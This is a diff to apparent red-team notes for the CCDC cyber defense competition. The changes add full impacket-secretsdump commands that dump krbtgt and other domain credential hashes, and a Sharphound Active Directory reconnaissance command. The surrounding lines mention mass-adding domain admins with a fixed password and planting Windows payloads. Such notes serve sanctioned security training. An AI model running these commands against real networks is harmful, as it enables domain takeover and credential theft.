@@ -21,7 +21,8 @@ pagetitle: Red Teaming for CCDC
   - **Domain:**
     - Run `mass_user_add_local.sh` with domain admin creds/hash against a DC to add a bunch of domain admins
       - Pass is `IWinAgain123#`
-    - Grab `krbtgt` (and other) hashes with `impacket-secretsdump 
+    - Grab `krbtgt` (and other) hashes with `impacket-secretsdump -hashes :{hash} {domain}/{user}@{DC_IP}` 
+      - Alternatively `impacket-secretsdump {domain}/{user}:'{password}'@{DC_IP}` with a password
   - **Windows:**
     - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
     - First, run `windows_add_payloads.ps1` to add the file to each of the locations
@@ -75,7 +76,7 @@ pagetitle: Red Teaming for CCDC
     - `interactive` to turn it into a normal session
 - Armory:
   - Install all with `armory install all`
-  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`shs
+  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`
 
 **Killing Services**
 - Soft breaks:
